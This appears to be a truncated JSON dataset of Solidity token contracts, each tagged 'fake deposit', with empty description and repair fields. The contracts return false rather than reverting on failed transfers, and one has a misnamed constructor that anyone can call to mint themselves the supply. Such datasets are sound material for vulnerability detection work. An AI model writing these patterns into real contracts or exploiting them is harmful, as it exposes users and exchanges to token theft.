[
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract VERSO is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000*10**uint256(decimals);\r\n    string public constant name = \"VERSO\";\r\n    string public constant symbol = \"VSO\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.6;\r\n\r\ncontract SafeRune {\r\n    string public name = 'Safu Rune';\r\n    uint8 public decimals = 18;\r\n    string public symbol = 'SafuRune';\r\n    string public version = '1.0';\r\n    uint256 public totalSupply = 0;\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n    Erc20Rune erc20RuneContract = Erc20Rune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n    function approve(address _spender, uint256 _value ) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function RedeemErc20Rune(uint256 _value) public {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            if(!erc20RuneContract.transfer(msg.sender, _value)) revert();\r\n            balances[msg.sender] -= _value;\r\n            totalSupply -= _value;\r\n            emit Transfer(msg.sender, address(this), _value);\r\n        } else { revert(); }\r\n    }\r\n\r\n    function MintSafeRune(uint256 _value) public {\r\n        // transferTo always returns true so theres no reason to check the return value. Reverts on fail\r\n        erc20RuneContract.transferTo(address(this), _value);\r\n        balances[msg.sender] += _value;\r\n        totalSupply += _value;\r\n        emit Transfer(address(this), msg.sender, _value);\r\n    }\r\n}\r\n\r\ninterface Erc20Rune {\r\n  function transferTo(address recipient, uint256 amount) external returns (bool);\r\n  function transfer(address _to, uint256 _value) external returns (bool success);\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'EthereumDoughnut' token contract\r\n//\r\n// Symbol      : ENUT \ud83c\udf69\r\n// Name        : Ethereum Doughnut\r\n// Total supply: 100000000000000\r\n// Decimals    : 18\r\n//\r\n// TOTAL SUPPLY 1,000,000,000,000,000\r\n// 50% Burned\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract EthereumDoughnut is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Ethereum Doughnut\";\r\n    string public constant symbol = \"ENUT \ud83c\udf69\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Keiko_Inu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Keiko Inu\";\r\n    string public constant symbol = \"KEIKO\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() public constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) public constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) public constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract BeastToken is StandardToken {\r\n\r\n    function () public {\r\n        revert();\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    constructor() public {\r\n        balances[msg.sender] = 1000000000000000000000000;\r\n        totalSupply = 1000000000000000000000000;\r\n        name = \"Beast Token\";\r\n        decimals = 18;\r\n        symbol = \"BEAST\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract EthereumIceCream is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Ethereum Ice Cream\";\r\n    string public constant symbol = \"ETHICE \ud83c\udf68\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\r\npragma solidity >=0.7.0 <0.8.0;\r\n\r\ncontract ERC20Interface {\r\n    \r\n    /// @return supply total amount of tokens\r\n    function totalSupply() public virtual view returns (uint256 supply) {}\r\n\r\n    /// @param tokenOwner The address from which the balance will be retrieved\r\n    /// @return balance The balance\r\n    function balanceOf(address tokenOwner) public virtual view returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return success Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) public virtual returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return success Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return success Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) public virtual returns (bool success) {}\r\n\r\n    /// @param tokenOwner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return remaining Amount of remaining tokens allowed to spent\r\n    function allowance(address tokenOwner, address _spender) public virtual view returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\ncontract StandardToken is ERC20Interface {\r\n    uint256 public _totalSupply;\r\n    \r\n    mapping (address => uint256) balances;\r\n    //[tokenOwner][spender] = value\r\n    //tokenOwner allows the spender to spend *value* of tokenOwner money\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function transfer(address _to, uint256 _value) public override returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address tokenOwner) public view override returns (uint256 balance) {\r\n        return balances[tokenOwner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public override returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address tokenOwner, address _spender) public view override returns (uint256 remaining) {\r\n      return allowed[tokenOwner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view override returns (uint) {\r\n        return _totalSupply  - balances[address(0)];\r\n    }\r\n\r\n}\r\n\r\ncontract MobiToken is StandardToken {\r\n\r\n    \r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H0.1';\r\n\r\n    constructor() {\r\n        _totalSupply = 410000000;                        // Update total supply\r\n        balances[msg.sender] = _totalSupply;          // Give the creator all initial tokens\r\n        name = \"Mobi Coin\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"MOBI\";                               // Set the symbol for display purposes\r\n    }\r\n    \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract AnalCoin is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = '1.1.3';\r\n\r\n    function AnalCoin(\r\n        ) {\r\n        balances[msg.sender] = 500000000000000000000000000;\r\n        totalSupply = 500000000000000000000000000;\r\n        name = \"CoinDev.io\";\r\n        decimals = 18;\r\n        symbol = \"ANAL\";\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2021-04-24\r\n*/\r\n\r\npragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\ncontract UnboundedRegularToken is RegularToken {\r\n\r\n    uint constant MAX_UINT = 2**256 - 1;\r\n\r\n    /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\r\n    /// @param _from Address to transfer from.\r\n    /// @param _to Address to transfer to.\r\n    /// @param _value Amount to transfer.\r\n    /// @return Success of transfer.\r\n    function transferFrom(address _from, address _to, uint _value)\r\n    public\r\n    returns (bool)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n        && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract STToken is UnboundedRegularToken {\r\n\r\n    uint public totalSupply = 33*10**25;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"StarToken\";\r\n    string constant public symbol = \"ST\";\r\n\r\n    function STSToken() {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
